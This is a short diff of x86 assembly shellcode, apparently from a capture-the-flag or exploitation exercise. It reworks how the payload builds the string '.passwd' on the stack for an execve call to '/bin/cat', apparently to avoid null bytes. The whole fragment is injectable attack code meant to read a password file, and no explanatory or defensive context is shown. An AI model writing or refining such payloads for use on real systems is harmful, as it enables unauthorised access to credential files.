@@ -20,12 +20,11 @@ pop eax ; execve
 xor edx, edx ; ptr to env = NULL
 
 ; data
-mov ebx, 0x647773AA
-shr ebx, 0x8
-push ebx ; swd\0
-push 0x7361702e ; .pas
+push edx ; NULL
+push 0x64777373 ; sswd
+push 0x61702e41 ; A.pa
 ; save esp (to build array later)
-mov ecx, esp
+lea ecx, [esp + 1]
 
 push edx ; NULL
 push 0x7461632f ; /cat
